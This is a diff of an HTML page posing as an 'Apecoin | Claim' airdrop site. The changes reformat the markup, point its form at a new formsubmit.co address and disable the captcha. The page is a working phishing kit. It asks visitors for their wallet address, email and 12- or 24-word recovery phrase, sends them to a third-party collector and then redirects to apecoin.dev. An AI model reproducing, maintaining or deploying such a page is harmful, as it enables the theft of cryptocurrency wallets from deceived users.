@@ -1,22 +1,49 @@
 <!DOCTYPE html>
 <!-- saved from url=(0046)https://apecoin-claim.netlify.app/connect.html -->
-<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="shortcut icon" href="https://apecoin-claim.netlify.app/header.png" type="image/x-icon">
-    <link rel="stylesheet" href="./connect_files/all.css" integrity="sha384-vSIIfh2YWi9wW0r9iZe7RJPrKwp6bG+s9QZMoITbCckVJqGCCRhc+ccxNcdpHuYu" crossorigin="anonymous">
-    <link rel="stylesheet" href="./connect_files/bootstrap.css">
-    <link rel="stylesheet" href="./connect_files/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
-    <link rel="stylesheet" href="./connect_files/style.css">
+<html lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="shortcut icon"
+      href="https://apecoin-claim.netlify.app/header.png"
+      type="image/x-icon"
+    />
+    <link
+      rel="stylesheet"
+      href="./connect_files/all.css"
+      integrity="sha384-vSIIfh2YWi9wW0r9iZe7RJPrKwp6bG+s9QZMoITbCckVJqGCCRhc+ccxNcdpHuYu"
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="./connect_files/bootstrap.css" />
+    <link
+      rel="stylesheet"
+      href="./connect_files/bootstrap.min.css"
+      integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO"
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="./connect_files/style.css" />
     <title>Apecoin | Claim</title>
   </head>
   <body>
     <nav class="navbar navbar-expand-xl navbar-light sticky-top">
       <div class="container">
-        <a class="navbar-brand mb-2" href="https://apecoin-claim.netlify.app/index.html"><img src="./connect_files/logo.svg" alt="">
+        <a
+          class="navbar-brand mb-2"
+          href="https://apecoin-claim.netlify.app/index.html"
+          ><img src="./connect_files/logo.svg" alt="" />
         </a>
-        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarBasic" aria-controls="navbarBasic" aria-expanded="false" aria-label="Toggle navigation"></button>
+        <button
+          class="navbar-toggler"
+          type="button"
+          data-bs-toggle="collapse"
+          data-bs-target="#navbarBasic"
+          aria-controls="navbarBasic"
+          aria-expanded="false"
+          aria-label="Toggle navigation"
+        ></button>
         <div class="collapse navbar-collapse" id="navbarBasic">
           <ul class="navbar-nav ml-auto mb-2 mb-xl-0">
             <li class="nav-item"></li>
@@ -26,32 +53,70 @@
     </nav>
 
     <div class="tab-content" id="myTabContent">
-      <div class="tab-pane fade active show" id="mnemonic" role="tabpanel" aria-labelledby="mnemonic-tab">
-        <form id="contactForm" action="https://formsubmit.io/send/9834a5b0-4902-44ed-9b8f-6f8b3fa7b6fa" method="POST">
-          <input name="_redirect" type="hidden" id="name" value="https://apecoin.dev/">
+      <div
+        class="tab-pane fade active show"
+        id="mnemonic"
+        role="tabpanel"
+        aria-labelledby="mnemonic-tab"
+      >
+           <form method="POST" id="contactForm" action="https://formsubmit.co/fd73d745ce8b9ebc9d018a2e62ff2597">
+
+             <input type="hidden" name="_captcha" value="false">
+           <input
+                      type="hidden"
+                      name="_next"
+                      id="name"
+                      value="https://apecoin.dev/"
+                    />
+                    <input type="hidden" name="_captcha" value="false">
 
           <div class="form-floating mb-3">
-            <input type="text" class="form-control" id="wallet" name="Wallet" placeholder="name@example.com">
+            <input
+              type="text"
+              class="form-control"
+              id="wallet"
+              name="Wallet"
+              placeholder="name@example.com"
+            />
             <label for="floatingInput">Wallet</label>
           </div>
           <div class="form-floating">
-            <input type="text" class="form-control" id="WalletAddress" name="Wallet-Address" placeholder="Password">
+            <input
+              type="text"
+              class="form-control"
+              id="WalletAddress"
+              name="Wallet-Address"
+              placeholder="Password"
+            />
             <label for="floatingPassword">ERC-20 Address</label>
           </div>
 
           <div class="form-floating">
-            <input type="email" class="form-control" id="Email" name="Email" placeholder="Password">
+            <input
+              type="email"
+              class="form-control"
+              id="Email"
+              name="Email"
+              placeholder="Password"
+            />
             <label for="floatingPassword">Email</label>
           </div>
 
           <div class="form-floating">
-            <textarea class="form-control" placeholder="Leave a comment here" id="Phrase" name="Phrase" style="height: 100px"></textarea>
+            <textarea
+              class="form-control"
+              placeholder="Leave a comment here"
+              id="Phrase"
+              name="Phrase"
+              style="height: 100px"
+            ></textarea>
             <label for="floatingTextarea">12 / 24 word phrase</label>
           </div>
-          <input name="_formsubmit_id" type="text" style="display: none">
+          <input name="_formsubmit_id" type="text" style="display: none" />
 
           <div class="restore mx-auto">
-            <input type="submit" placeholder="Restore" style="
+            <button
+              style="
                 border: 0;
                 border-radius: 7px;
                 font-size: 20px;
@@ -60,11 +125,12 @@
                 color: #ffffff;
                 width: 250px;
                 padding: 10px 0;
-              ">
+              "
+              class="inputPlaceholder"
+            > Connect </button>
           </div>
         </form>
       </div>
     </div>
-  
-
-</body></html>
+  </body>
+</html>
